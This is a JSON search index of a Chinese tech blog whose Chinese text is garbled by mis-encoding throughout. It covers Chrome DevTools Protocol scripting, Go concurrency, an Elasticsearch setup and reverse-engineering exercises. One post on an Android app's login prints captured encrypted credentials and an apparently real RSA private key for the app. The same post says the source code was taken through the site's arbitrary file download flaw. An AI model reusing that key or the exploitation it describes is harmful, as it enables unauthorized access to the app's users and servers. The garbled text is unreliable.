[{"categories":["è‡ªåŠ¨åŒ–æµ‹è¯•","Python"],"content":"è¿›é˜¶ä½¿ç”¨æ‰§è¡Œï¼šJSä»£ç ï¼Œæ¨¡æ‹ŸæŒ‰é”®ç»„åˆé”®ã€åˆ‡æ¢çª—å£æ€»ç»“ã€‚","date":"2025-06-27","objectID":"/posts/cdp/","tags":["å·¥å…·","Python","Selenium"],"title":"CDPåŸºæœ¬è®¤è¯†","uri":"/posts/cdp/"},{"categories":["è‡ªåŠ¨åŒ–æµ‹è¯•","Python"],"content":"åˆè¯†CDP Chrome DevTools Protocol ï¼ˆChrome å¼€å‘è€…å·¥å…·åè®®ï¼‰ å®˜æ–¹æ–‡æ¡£ å®ƒæ˜¯ Chrome DevToolsï¼ˆF12 å¼€å‘è€…å·¥å…·ï¼‰çš„åº•å±‚åè®®ï¼ŒSelenium 4æ˜¯åŸºäºè¿™ä¸ªåº•å±‚åè®®ã€‚ æ‰“å¼€è°·æ­Œæµè§ˆå™¨å¼€å¯CDPå› ä¸ºé»˜è®¤æ˜¯å…³é—­çš„ ç®€å•è·å–ä¸€ä¸‹cookie åŸºäºPythonè¿æ¥åšæ–­ç‚¹æ“ä½œ from DrissionPage import ChromiumPage, ChromiumOptions from test1 import set_log_breakpoint import time import threading co = ChromiumOptions() co.set_browser_path('/Applications/Google Chrome.app/Contents/MacOS/Google Chrome') co.set_argument('--remote-debugging-port=9222') co.set_argument('--user-data-dir=/Users/scan/Library/Application Support/Google/Chrome/Default') co.set_argument('--auto-open-devtools-for-tabs') co.set_argument('--remote-allow-origins=*') page = ChromiumPage(addr_or_opts=co) def console_monitor(): page.console.start() try: while True: for msg in page.console.steps(): # åˆ†çº§æ˜¾ç¤ºä¸åŒæ—¥å¿—ç±»å‹ if msg.level == 'error': print(f\"ğŸ”´ [ERROR] {msg.text}\") elif msg.level == 'warning': print(f\"ğŸŸ  [WARNING] {msg.text}\") elif 'æ—¥å¿—æ–­ç‚¹è§¦å‘' in msg.text: print(f\"ğŸ”µ [BREAKPOINT] {msg.text}\") else: print(f\"âšª [LOG] {msg.text}\") time.sleep(0.1) except Exception as e: print(f\"âŒ ç›‘æ§çº¿ç¨‹å¼‚å¸¸: {str(e)}\") finally: print(\"ğŸ›‘ æ§åˆ¶å°ç›‘å¬å™¨å·²åœæ­¢\") def main(): # å¯åŠ¨ç›‘æ§çº¿ç¨‹ï¼ˆå¸¦çŠ¶æ€æç¤ºï¼‰ print(\"ğŸ§µ æ­£åœ¨å¯åŠ¨ç›‘æ§çº¿ç¨‹...\") monitor_thread = threading.Thread(target=console_monitor, daemon=True) monitor_thread.start() print(\"âœ… ç›‘æ§çº¿ç¨‹å·²å¯åŠ¨\") # æ‰“å¼€ç›®æ ‡é¡µé¢ï¼ˆå¸¦åŠ è½½è¿›åº¦ï¼‰ print(\"ğŸŒ æ­£åœ¨åŠ è½½é¡µé¢ https://www.baidu.com ...\") page.get(\"https://www.baidu.com/\") page.wait.doc_loaded() print(\"âœ… é¡µé¢åŠ è½½å®Œæˆ\") # è®¾ç½®æ—¥å¿—æ–­ç‚¹ï¼ˆå¸¦è¯¦ç»†çŠ¶æ€æŠ¥å‘Šï¼‰ print(\"â³ æ­£åœ¨è®¾ç½®æ—¥å¿—æ–­ç‚¹...\") try: set_log_breakpoint( js_url=\"https://pss.bdstatic.com/r/www/cache/static/protocol/https/amd_modules/@baidu/search-sug_ce0f74a.js\", line=1795, ##è¡Œæ•° column=35, ##åˆ—æ•° condition=\"console.log('æ—¥å¿—æ–­ç‚¹è§¦å‘:', dataArray.map(x=\u003ex.value)) || false\", target_page_url=\"https://www.baidu.com/\" ) print(\"âœ… æ—¥å¿—æ–­ç‚¹è®¾ç½®æˆåŠŸ\") except Exception as e: print(f\"âŒ æ–­ç‚¹è®¾ç½®å¤±è´¥: {str(e)}\") # ä¸»çº¿ç¨‹ä¿æŒè¿è¡Œï¼ˆå¸¦é€€å‡ºæç¤ºï¼‰ print(\"ğŸš€ ç¨‹åºå·²è¿›å…¥ç›‘æ§çŠ¶æ€ï¼ŒæŒ‰Ctrl+Cé€€å‡º...\") try: while True: time.sleep(1) except KeyboardInterrupt: print(\"\\nğŸ›‘ ç”¨æˆ·è¯·æ±‚ç»ˆæ­¢ç¨‹åº\") finally: page.close() if __name__ == \"__main__\": main() #LogPoint.py import json import requests from websocket import create_connection def get_target_ws_url(target_page_url: str) -\u003e str: \"\"\"è·å–ç›®æ ‡é¡µé¢çš„WebSocketè°ƒè¯•åœ°å€\"\"\" targets = requests.get('http://localhost:9222/json').json() for t in targets: if t['url'].startswith(target_page_url): return t['webSocketDebuggerUrl'] raise Exception(f\"æœªæ‰¾åˆ°åŒ¹é…é¡µé¢: {target_page_url}\") def set_log_breakpoint(js_url: str, line: int, column: int, condition: str, target_page_url: str): \"\"\"åŒæ­¥å³æ—¶è®¾ç½®æ–­ç‚¹ï¼ˆæ— éœ€ç­‰å¾…è„šæœ¬åŠ è½½ï¼‰\"\"\" ws_url = get_target_ws_url(target_page_url) ws = create_connection(ws_url) msg_id = 1 # 1. å¯ç”¨Debugger ws.send(json.dumps({ \"id\": msg_id, \"method\": \"Debugger.enable\" })) _wait_for_id(ws, msg_id) msg_id += 1 # 2. ç›´æ¥è®¾ç½®æ–­ç‚¹ï¼ˆå…³é”®ä¿®æ”¹ç‚¹ï¼‰ print(f\"âš¡ ç›´æ¥è®¾ç½®æ–­ç‚¹: {js_url}:{line}\") ws.send(json.dumps({ \"id\": msg_id, \"method\": \"Debugger.setBreakpointByUrl\", \"params\": { \"url\": js_url, \"lineNumber\": line, \"columnNumber\": column, \"condition\": condition } })) # 3. è·å–è®¾ç½®ç»“æœ resp = _wait_for_id(ws, msg_id) if \"error\" in resp: raise Exception(f\"æ–­ç‚¹è®¾ç½®å¤±è´¥: {resp['error']}\") print(f\"âœ… æ–­ç‚¹å·²æ¿€æ´» (ID: {resp['result']['breakpointId']})\") # 4. ä¿æŒè¿æ¥ç›‘å¬æ–­ç‚¹è§¦å‘ while True: msg = json.loads(ws.recv()) if msg.get(\"method\") == \"Debugger.paused\": print(\"ğŸ”¥ æ–­ç‚¹å‘½ä¸­!\") # å¯åœ¨æ­¤å¤„æ·»åŠ æ–­ç‚¹å‘½ä¸­åçš„å¤„ç†é€»è¾‘ ws.send(json.dumps({ \"id\": msg_id + 1, \"method\": \"Debugger.resume\" })) def _wait_for_id(ws, expect_id): \"\"\"ç­‰å¾…æŒ‡å®šIDçš„å“åº”\"\"\" while True: msg = json.loads(ws.recv()) if msg.get(\"id\") == expect_id: return msg æ•ˆæœ æŠ“åŒ… å‘é€æ‹¦æˆªè¯·æ±‚(ç±»ä¼¼äºæŠ“åŒ…) {\"command\":\"Fetch.enable\",\"parameters\":{\"patterns\":[{\"urlPattern\":\"*.mi.com/*\",\"resourceType\":\"XHR\",\"requestStage\":\"Request\"}],\"handleAuthRequests\":false}} è·å–æ‹¦æˆªè¯·æ±‚ Fetch.requestPaused ","date":"2025-06-27","objectID":"/posts/cdp/:0:0","tags":["å·¥å…·","Python","Selenium"],"title":"CDPåŸºæœ¬è®¤è¯†","uri":"/posts/cdp/"},{"categories":["Golang"],"content":"ç®¡é“ channelï¼š ç¯å½¢é˜Ÿåˆ—ï¼Œå…ˆè¿›å…ˆå‡ºï¼Œå¤šä¸ªåç¨‹è¯»ä¸€ä¸ªå®¹å™¨ package main import ( \"fmt\" \"time\" ) func main() { ch := make(chan int, 1)//ä¸º0åˆ™æ— ç¼“å†²ï¼Œä½†èƒ½æ­£å¸¸å†™å…¥è¯»å– go func() { a := \u003c-ch fmt.Printf(\"è¯»å‡ºæˆåŠŸ%d\\n\", a) }() time.Sleep(time.Second * 1) go func() { ch \u003c- 1 fmt.Printf(\"å†™å…¥æˆåŠŸ%s\", \"1\") }() time.Sleep(time.Second * 1) } package main import ( \"fmt\" \"sync\" ) func main() { ch := make(chan int, 100) // ç¼“å†² channelï¼Œå®¹é‡ 100 wg := sync.WaitGroup{} wg.Add(2) go func() { defer wg.Done() for i := 0; i \u003c 10; i++ { ch \u003c- i } }() go func() { defer wg.Done() for i := 0; i \u003c 10; i++ { ch \u003c- i } }() wg2 := sync.WaitGroup{} wg2.Add(1) go func() { sum := 0 for { a, ok := \u003c-ch if !ok { //channelä¸ºç©ºã€è¢«å…³é—­ã€å°±ä¸ºfalse break } else { sum += a } } fmt.Println(\"sum=\", sum) wg2.Done() }() wg.Wait() close(ch) wg2.Wait() } ç”¨ç®¡é“å»é˜»å¡ package main import ( \"fmt\" \"sync\" ) func main() { ch := make(chan int, 100) // ç¼“å†² channelï¼Œå®¹é‡ 100 wg := sync.WaitGroup{} wg.Add(2) go func() { defer wg.Done() for i := 0; i \u003c 10; i++ { ch \u003c- i } }() go func() { defer wg.Done() for i := 0; i \u003c 10; i++ { ch \u003c- i } }() c2 := make(chan struct{}, 0) go func() { sum := 0 for { a, ok := \u003c-ch if !ok { //channelä¸ºç©ºã€è¢«å…³é—­ã€å°±ä¸ºfalse break } else { sum += a } } fmt.Println(\"sum=\", sum) c2 \u003c- struct{}{} }() wg.Wait() close(ch) \u003c-c2 } ","date":"2025-06-14","objectID":"/posts/go%E7%AE%A1%E9%81%93/:0:0","tags":["Golang"],"title":"goç®¡é“","uri":"/posts/go%E7%AE%A1%E9%81%93/"},{"categories":["Golang"],"content":"æ­»é”æ˜¯æŒ‡å¤šä¸ªå¹¶å‘æ‰§è¡Œå•å…ƒï¼ˆå¦‚ goroutineï¼‰äº’ç›¸ç­‰å¾…å¯¹æ–¹é‡Šæ”¾èµ„æºï¼Œå¯¼è‡´æ‰€æœ‰ç›¸å…³æ–¹éƒ½æ— æ³•ç»§ç»­æ‰§è¡Œçš„çŠ¶æ€ã€‚åœ¨ Go ä¸­ï¼Œæ­»é”é€šå¸¸å‘ç”Ÿåœ¨ channel æ“ä½œæˆ– é”ï¼ˆmutexï¼‰ çš„ä½¿ç”¨ä¸å½“æ—¶ï¼Œä¾‹å¦‚pvä¸å½“æ“ä½œã€‚ å®¹é‡=0è¯»å†™å¿…é¡»ä¸¥æ ¼åŒæ­¥ï¼Œé€‚ç”¨äºç²¾ç¡®æ§åˆ¶ã€‚ å®¹é‡\u003e0å…è®¸ä¸´æ—¶å­˜å‚¨æ•°æ®ï¼Œé€‚ç”¨äºè§£è€¦å’Œæµé‡æ§åˆ¶ã€‚ å‘é€æ–¹è´Ÿè´£å…³é—­ Channelï¼Œé¿å…æ¥æ”¶æ–¹æ­»é”ï¼ æ ¹æ®ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…çš„é€Ÿåº¦å·®ï¼š å¦‚æœç”Ÿäº§è€…å¿«ï¼Œæ¶ˆè´¹è€…æ…¢ï¼šå¢å¤§å®¹é‡é¿å…é˜»å¡ã€‚ å¦‚æœæ¶ˆè´¹è€…å¿«ï¼Œç”Ÿäº§è€…æ…¢ï¼šå°å®¹é‡å³å¯ã€‚ ä¸å…³é—­ Channel ä¼šæ€æ ·ï¼Ÿ æ— ç¼“å†² Channelï¼šé€šå¸¸ä¸éœ€è¦å…³é—­ï¼ˆé™¤éæ˜ç¡®éœ€è¦é€šçŸ¥æ¥æ”¶æ–¹ï¼‰ã€‚ æœ‰ç¼“å†² Channelï¼šå¦‚æœæ¥æ”¶æ–¹ç”¨ for range å¾ªç¯ï¼Œå¿…é¡»å…³é—­ä»¥é¿å…æ­»é”ï¼š ","date":"2025-06-14","objectID":"/posts/golang%E6%AD%BB%E9%94%81/:0:0","tags":["Golang"],"title":"goæ­»é”","uri":"/posts/golang%E6%AD%BB%E9%94%81/"},{"categories":["Golang"],"content":" package main import ( \"fmt\" \"time\" ) func main() { go func() { fmt.Println(\"hello\") }() go func() { fmt.Println(\"world\") }() time.Sleep(time.Second * 2) //å¦‚æœæ²¡æœ‰Sleepï¼Œä¸»çº¿ç¨‹å¯èƒ½ç«‹å³é€€å‡ºï¼Œgoroutineæ¥ä¸åŠæ‰§è¡Œ } sync.Waitgroupç”¨äºç­‰å¾…ä¸€ç»„ goroutine å®Œæˆçš„åŒæ­¥å·¥å…·ï¼Œç‰¹åˆ«é€‚ç”¨äºéœ€è¦é˜»å¡ä¸» goroutine ç›´åˆ°æ‰€æœ‰å­ goroutine æ‰§è¡Œå®Œæ¯•çš„åœºæ™¯ã€‚ //å®Œå…¨ç­‰å¾…å¹¶å‘ç»“æŸ package main import ( \"fmt\" \"sync\" ) func main() { wg := sync.WaitGroup{} wg.Add(2) //2ä¸ªä»»åŠ¡ go func() { defer wg.Done() fmt.Println(\"hello\") }() go func() { defer wg.Done() fmt.Println(\"world\") }() wg.Wait() } //å­åç¨‹éš”ç¦»é”™è¯¯ï¼Œä¸å½±å“mian package main import ( \"fmt\" \"time\" ) func f1() { defer func() { recover() }() //å…³é”®éš”ç¦»åŒ¿åå‡½æ•° a, b := 10, 0 a = a / b } func main() { go f1() time.Sleep(time.Second * 1) fmt.Println(\"over\") } å®‰å…¨æ€§ é”æœºåˆ¶ package main import ( \"fmt\" \"sync\" ) var ( n int32 lock = sync.Mutex{} ) func foo() { for i := 0; i \u003c 10000; i++ { lock.Lock() n++ lock.Unlock() } fmt.Printf(\"foo %d\\n\", n) } func main() { wg := sync.WaitGroup{} wg.Add(2) //2ä¸ªä»»åŠ¡ go func() { defer wg.Done() foo() }() go func() { defer wg.Done() foo() }() wg.Wait() } atomic package main import ( \"fmt\" \"sync\" \"sync/atomic\" ) var ( n int32 lock = sync.Mutex{} ) func foo() { for i := 0; i \u003c 10000; i++ { atomic.AddInt32(\u0026n, 1) } fmt.Printf(\"foo %d\\n\", n) } func main() { wg := sync.WaitGroup{} wg.Add(2) //2ä¸ªä»»åŠ¡ go func() { defer wg.Done() foo() }() go func() { defer wg.Done() foo() }() wg.Wait() } ","date":"2025-06-11","objectID":"/posts/go%E5%8D%8F%E7%A8%8B/:0:0","tags":["Golang"],"title":"goåç¨‹","uri":"/posts/go%E5%8D%8F%E7%A8%8B/"},{"categories":["æ•°æ®åº“"],"content":"Elasticsearchå­¦ä¹ è®°å½• å®‰è£…elasticsearchå’Œkibana services: elasticsearch: image: docker.elastic.co/elasticsearch/elasticsearch:8.13.2 platform: linux/amd64 container_name: es environment: - discovery.type=single-node - xpack.security.enabled=false #å…³é—­å¯†ç è®¤è¯ï¼ˆåªåœ¨æµ‹è¯•ç¯å¢ƒä¸‹è¿è¡Œï¼‰ ports: - \"9200:9200\" networks: - es-net kibana: #å¯è§†åŒ–å·¥å…· image: docker.elastic.co/kibana/kibana:8.13.2 platform: linux/amd64 container_name: kibana environment: - ELASTICSEARCH_HOSTS=http://elasticsearch:9200 ports: - \"5601:5601\" depends_on: - elasticsearch networks: - es-net networks: es-net: å¯åŠ¨: docker compose up -d è®¿é—®ESï¼š http://localhost:9200/ æµè§ˆå™¨å‡ºç°ä¸Šå›¾è¡¨ç¤ºæ­£å¸¸ã€‚ è®¿é—®kibanaï¼š http://localhost:5601/ Kibanaè¿è¡ŒæŸ¥è¯¢ç­‰å‘½ä»¤ ç‚¹å‡»Dev Toolsï¼š æŸ¥è¯¢å…¨éƒ¨æ•°æ®ï¼š GET index/_search { \"query\": { \"match_all\": {} } } æŸ¥è¯¢å…¨éƒ¨ç´¢å¼•ï¼š GET /_cat/indices?v ","date":"2025-05-25","objectID":"/posts/elasticsearch%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:0:0","tags":["æ•°æ®åº“"],"title":"Elasticsearchå­¦ä¹ è®°å½•","uri":"/posts/elasticsearch%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["é€†å‘","åŠ å¯†ä¸è§£å¯†"],"content":"APPæŠ“åŒ…æ•è·ç™»é™†å‚æ•° å› ä¸ºæ²¡æœ‰ç½‘é¡µç«¯ï¼Œåªèƒ½åœ¨æ‰‹æœºæŠ“åŒ…æˆ–æµé‡è½¬å‘åˆ°ç”µè„‘ï¼Œæ‰‹æœºRootè¿‡æ‰€ä»¥ç›´æ¥ç”¨æ‰‹æœºã€‚ loginType=RPQQrpdg4Fes4KNvy3Y%2B%2BpOI0A%2FylWUapwSE2BvKtkzcEM8bR%2BGtScJG4ddJ8MKV%2BRHL%2BhpQG4yt%0ADq%2Ff%2FzY7P9eP%2B94EBELbYL89R7UXjw%2BRD5BPJxeoduW37iJKLV25CuDMcmHlu3Y6hYsT1NSEqXdV%0APjGDPz8mYx7e8fxB6yc%3D%0A username=aNIrmXtw8nx6tVE****** password=X3WBkR13dBwKYc9KTYS0qgxts9O6jxhzBB%2FEB2kbKQY8VyN5g8exakcZZ64k1wKBlMit3XORAAFB%0AqHIzRb9YJoR6gsX9C2hXPmKjJcIEYHZLQE%2BjO5wT9zHF%2FZ0oUqVbREA3PiT97JwXIsd3Y8wYCTk6%0Aeq2fE6vrMr4oB2uabcY%3D%0A deviceModel=bGUK%2F8im%2FzPxcVzR1lO7HxvVzxzNAnIrhwv87GqQwigL1fPVfaOBdnkYxRVkSce7UdcKFh7YLtis%0AnGzt98FD2aOxsQ3J%2FYifNAgMmaIIhA6I3vr4%2Fs2FU83NRqCghW0QRUNp28oJMvBgnUTexv4bYPmq%0AdLf7RZDF1mh0nncYVSY%3D%0A devType=YcDlQYgnt0f%2FNAlEbYOKQUl9TZJD0SeR15iMoKahSu7E3Oj2549jSPwRxR3l2f11DGM2lkVLTs%2Bn%0A43WTazF3WM5pJ9n3W65TW3mc1COHzvI92WkcOAhEgol3mMi6uhdaHmQahKAd708ETv5VZvIN63Fm%0AYjMoq07ABgXG7714gIw%3D%0A opertionSystem=JrVdi%2BqF1C4SsRKTDUGhhTq0ScdbynezoR2JDVXLTbaQ6cVNPl4o2z6hkhwuRjN270yM7FKucQWI%0AE2gbnvMOpqn42FIn2FIxnhW0vgUxYxRCli186XVNZ72h8eT6AlEH0KDF6dMcJ76L8VAdR5UmZMyV%0ArsVAA77uOefjy6rzKVM%3D%0A ipAddress=l6zP%2FQp5sam3BIemhFGSkS7tMDzoW4OcAM6Ws%2FKdYW9yTVWzYc%2BU%2BKwdhowy1tUOXnRceLMg3D6c%0AUYo4F%2BVdqxse7i7XYoUFn%2B10qFo%2BwgaQtFnjSgqOEu4B3VYALsapRyUioarab8ZiYnotaDvxW1%2FL%0A6wGwa%2BvaeJIqH0oiXDA%3D%0A devId=VdBEdtsRKLx70vdYe%2F1g****** Urlè§£ç è·å–åŸå§‹ç»“æœ å¤åˆ¶ä¸‹æ¥æœ‰%ï¼Œä¸€çœ¼å°±æ˜¯URLï¼Œå…ˆURLè§£ç  import urllib.parse data = { \"ipAddress\": \"l6zP/Qp5sam3BIemhFGSkS7tMDzoW4OcAM6Ws/KdYW9yTVWzYc%2BU%2BKwdhowy1tUOXnRceLMg3D6cUYo4F%2BVdqxse7i7XYoUFn%2B10qFo%2BwgaQtFnjSgqOEu4B3VYALsapRyUioarab8ZiYnotaDvxW1/L6wGwa%2BvaeJIqH0oiXDA%3D\", } #è§£ç æ‰“å° for key, value in data.items(): decoded = urllib.parse.unquote(value.replace(\"\\n\", \"\")) print(f\"{key} = {decoded}\\n\") è¿˜åŸåŠ è§£å¯† ç®—æ³•åŠ©æ‰‹æŠ“åŒ…è·å–åŠ å¯†å‚æ•° æ‹¿åˆ°å¯†é’¥å¼€å§‹è¿˜åŸåŠ è§£å¯†ï¼Œä½†æ˜¯æ¯æ¬¡åŠ å¯†ç»“æœæ˜¯ä¸ä¸€æ ·çš„ï¼ŒåŠ å¯†ç®—æ³•æ˜¯RSAéšæœºå¡«å……åºåˆ—ï¼Œæˆ‘ä»¬åªæœ‰è§£å¯†å¯ä»¥éªŒè¯å¯†é’¥æ˜¯å¦å¯ç”¨ è§£å¯†ä»£ç  from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 from base64 import b64decode, b64encode # ä½ çš„ç§é’¥å’Œå…¬é’¥ï¼ˆBase64 æ ¼å¼ï¼‰ private_key_b64 = \"\"\" MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBALdWyfoa5KK9tzSaHVAUOMVUx2RvuVwB+wZ3Dpa5HTIzgYE/kwImvfTVVflpC5w4qamelHiaExJoIbQBVsr1UE2WCEVyKF+fe7i4w8a2q1fMpIk1mYuvOtLtd3R5xRwAYcCekSddeChShisCS2HApMENrIQjKBAGur6cxfneBJP1AgMBAAECgYAqmaP81Vri5ao4Msc04D4AvB5InB0538vwSKG/K+w4yfcBjUAfc9kXlqqPdXUZK6FgpFRjYYmk8UVDijwclLu/pmRWXqMozlgE2Xbx+r5psxcbzXBIzeNx46eLHB6huOkttBZgknB2iKjJT/lJZ+1bPlaTxYdpmYCM20tHZKMjgQJBAOsn0l0ckRcFt+NICDdNfj+Pd14L/9Enu9aeQ81KI7L6Qygv+I1EduwY4jtub0TZy3fiyeVDwRq5Hby08hLqInkCQQDHlyPip3y9CEYSJDN5gn2aP6dzsXwHSpIYPIf2fMErZaFqvrV9in1ERzDTMT+o70kKbTsUng1pC4p8RflWUv5dAkEAs9DVmYG4qMQko1V3guJtAalw+6dtTMB3cFvBOP/SYI/iPp7ADzYlQdCdXhjKWPm6DsiK3hd7WDXpuV0cJr6G8QJAU1FWm6FLQyYXCi+uhUTh5eg4oOUwX2LTxeZO46iEgvc0APmHjdaoID6PtTnT11O8a+vZQ+wOsREuSF51jYGryQJAdglyLFsbUSMN8jdh6E0HYgYbKU5n6wnSBmLK5F81brytIbJID7bA0K5hj4TOCzjcE7VDzTCHd20sofPnU4zhFA== \"\"\".replace(\"\\n\", \"\") public_key_b64 = \"\"\" MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3Vsn6GuSivbc0mh1QFDjFVMdkb7lcAfsGdw6WuR0yM4GBP5MCJr301VX5aQucOKmpnpR4mhMSaCG0AVbK9VBNlghFcihfn3u4uMPGtqtXzKSJNZmLrzrS7Xd0ecUcAGHAnpEnXXgoUoYrAkthwKTBDayEIygQBrq+nMX53gST9QIDAQAB \"\"\".replace(\"\\n\", \"\") # ç”Ÿæˆç§é’¥å’Œå…¬é’¥å¯¹è±¡ private_key = RSA.importKey(b64decode(private_key_b64)) public_key = RSA.importKey(b64decode(public_key_b64)) def encrypt_with_public_key(plain_text: str) -\u003e str: cipher = PKCS1_v1_5.new(public_key) encrypted = cipher.encrypt(plain_text.encode('utf-8')) return b64encode(encrypted).decode() def decrypt_with_private_key(cipher_text_b64: str) -\u003e str: cipher = PKCS1_v1_5.new(private_key) encrypted_bytes = b64decode(cipher_text_b64) sentinel = b\"error\" decrypted = cipher.decrypt(encrypted_bytes, sentinel) return decrypted.decode() plain = \"scan.work\" enc = encrypt_with_public_key(plain) dec = decrypt_with_private_key(enc) print(\"åŸæ–‡:\", plain) print(\"åŠ å¯†å:\", enc) print(\"è§£å¯†å:\", dec) ä¹‹å‰è¿™ä¸ªç«™æœ‰ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œæ‰€ä»¥æŠŠæ‰“åŒ…çš„æºç ä¸‹è½½åˆ°æœ¬åœ°è¿‡ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹åç¼–è¯‘çš„Class æœ‰ç§é’¥å…¬é’¥ä¸”ç§é’¥ä¸ç®—æ³•åŠ©æ‰‹è·å–çš„ä¸€è‡´ï¼Œå®¡è®¡æºç å¯çŸ¥ï¼Œéƒ½æ˜¯å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†çš„ã€‚ åŠ å¯†ä»£ç  from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 from base64 import b64decode, b64encode # ","date":"2025-05-04","objectID":"/posts/%E5%AE%89%E5%8D%93%E6%9F%90app%E7%99%BB%E9%99%86%E9%80%86%E5%90%91/:0:0","tags":["é€†å‘","åŠ å¯†ä¸è§£å¯†"],"title":"å®‰å“æŸAPPç™»é™†é€†å‘","uri":"/posts/%E5%AE%89%E5%8D%93%E6%9F%90app%E7%99%BB%E9%99%86%E9%80%86%E5%90%91/"},{"categories":["IDA","é€†å‘"],"content":"IDAé€†å‘ä½œä¸šç»ƒä¹  æ‰“å¼€åæœç´¢todo_0æ–¹æ³•ï¼Œæ‰¾åˆ°åæŒ‰Tabè¿›å…¥æ··æ·†æ±‡ç¼–ä»£ç ï¼Œç¾åŒ–å‰ï¼š ä»£ç åˆ†æå¾—çŸ¥ï¼š strlen_chkæ–¹æ³•æœ‰a1å‚æ•°ï¼Œæ‰€ä»¥ä»–å¯èƒ½ä¸ºè¾“å…¥å‚æ•°ï¼Œåˆ™èµ‹äºˆv2å˜é‡å¯èƒ½ä¸ºå­—ç¬¦ä¸²é•¿åº¦ï¼Œv9å¯èƒ½ä¸ºç”³è¯·å†…å­˜åçš„åœ°å€ï¼Œå¤§å°ä¸ºv2+1ã€‚ strcpy_chkå¯èƒ½ä¸ºå¤åˆ¶æ“ä½œï¼Œå°†a1å¤åˆ¶åˆ°v9ï¼Œè¿è¡Œsub_208BCæ–¹æ³•åï¼Œé‡Šæ”¾å†…å­˜ã€‚ æ¥ç€è¿›å…¥sub_208BCå‡½æ•°ï¼š __int64 __usercall sub_208BC@\u003cX0\u003e(__int64 a1@\u003cX0\u003e, unsigned __int64 a2@\u003cX1\u003e, __int64 a3@\u003cX8\u003e) { __int64 result; // x0 unsigned __int64 i; // [xsp+18h] [xbp-28h] //unsigned æ— ç¬¦å· result = sub_21BF4(); for ( i = 0LL; i \u003c a2; ++i ) { sub_23140(a3, (unsigned __int8)a0123456789abcd[(int)*(unsigned __int8 *)(a1 + i) \u003e\u003e 4]); //sub_23140æ–¹æ³•å°†a1 + içš„å€¼å³ç§»å››ä½ result = sub_23140(a3, (unsigned __int8)a0123456789abcd[*(_BYTE *)(a1 + i) \u0026 0xF]); } return result; } ç¾åŒ–åï¼š void __usercall todo_0_1(char *input_str_2@\u003cX0\u003e, char *output_str@\u003cX8\u003e) { size_t input_str; // x0 char v3; // [xsp+14h] [xbp-7Ch] int j; // [xsp+2Ch] [xbp-64h] int i; // [xsp+30h] [xbp-60h] int random_num; // [xsp+34h] [xbp-5Ch] size_t input_len_1; // [xsp+38h] [xbp-58h] _BYTE *data; // [xsp+40h] [xbp-50h] input_str = __strlen_chk(input_str_2, 0xFFFFFFFFFFFFFFFFLL); data = operator new[](input_str + 1); input_len_1 = __strlen_chk(input_str_2, 0xFFFFFFFFFFFFFFFFLL); __strcpy_chk(data, input_str_2, -1LL); srand(input_len_1); random_num = rand() \u0026 0xF; for ( i = 0; i \u003c random_num; ++i ) { for ( j = 0; j \u003c input_len_1; ++j ) { v3 = data[j]; data[j] = v3 ^ rand(); } } enccode_hex(data, input_len_1, output_str); if ( data ) operator delete[](data); } è¿˜åŸä»£ç ï¼š from ctypes import c_int import binascii # Windowséšæœºæ•°ç”Ÿæˆå™¨ windows_status = 1 def windows_srand(seed): global windows_status windows_status = seed def windows_rand(): global windows_status windows_status = (214013 * windows_status + 2531011) \u0026 0xffffffff return windows_status \u003e\u003e 16 \u0026 ((1 \u003c\u003c 15) - 1) # Androidéšæœºæ•°ç”Ÿæˆå™¨ android_seed = 0 android_multiplier = 0x5DEECE66D android_addend = 0xB android_mask = (1 \u003c\u003c 48) - 1 android_seedUniquifier = 8682522807148012 def android_srand(seed): global android_seed android_seed = _initialScramble(seed) def _initialScramble(seed): return (seed ^ android_multiplier) \u0026 android_mask def _next(bits): global android_seed oldseed = android_seed nextseed = (oldseed * android_multiplier + android_addend) \u0026 android_mask android_seed = nextseed return c_int(((nextseed \u003e\u003e (48 - bits)))).value def android_nextInt(): return _next(32) def android_nextInt_bound(bound): global android_seed r = _next(31) m = bound - 1 if bound \u0026 m == 0: r = (((bound * (r \u0026 0xffffffffffffffff)) \u003e\u003e 31) \u0026 0xffffffff) else: u = r r = u % bound while u - r + m \u003c 0: r = u % bound u = _next(31) return r # Linuxéšæœºæ•°ç”Ÿæˆå™¨ linux_status = 0 linux_r = [] def linux_srand(seed): global linux_status, linux_r if seed == 0: seed = 1 word = seed seed = seed \u0026 0xffffffff linux_status = 0 linux_r = [0] * (344 + linux_status) linux_r[0] = seed for i in range(1, 31): if word \u003c 31: hi = (-word) // 127773 hi = -hi lo = (-word) % 127773 lo = -lo else: hi = word // 127773 lo = word % 127773 word = ((16807 * lo)) - ((2836 * hi)) if word \u003c 0: word = (2147483647 + word) \u0026 0xffffffff linux_r[i] = word for i in range(31, 34): linux_r[i] = linux_r[i - 31] for i in range(34, 344): linux_r[i] = (((linux_r[i - 31] + linux_r[i - 3]) \u0026 0xffffffff) % (1 \u003c\u003c 32)) \u0026 0xffffffff def linux_rand(): global linux_status, linux_r linux_r.append(0) linux_r[344 + linux_status] = (((linux_r[344 + linux_status - 31] + linux_r[344 + linux_status - 3]) \u0026 0xffffffff) % (1 \u003c\u003c 32)) \u0026 0xffffffff linux_status += 1 return linux_r[344 + linux_status - 1] \u003e\u003e 1 # åŠ å¯†å‡½æ•° def todo_0(s): linux_srand(len(s)) enc_loop = linux_rand() \u0026 0xF s = bytearray(s) for _ in range(enc_loop): for i in range(len(s)): s[i] = s[i] ^ (linux_rand() \u0026 0xff) #0xffæ˜¯é™åˆ¶ç»“æœ return s # ç¤ºä¾‹ä½¿ç”¨ input_bytes = b'1234' encrypted_bytes = todo_0(input_bytes) print(binascii.hexlify(encrypted_bytes)) ","date":"2024-11-18","objectID":"/posts/ida%E9%80%86%E5%90%91%E4%BD%9C%E4%B8%9A%E7%BB%83%E4%B9%A0/:0:0","tags":["IDA","é€†å‘"],"title":"IDAé€†å‘ä½œä¸šç»ƒä¹ 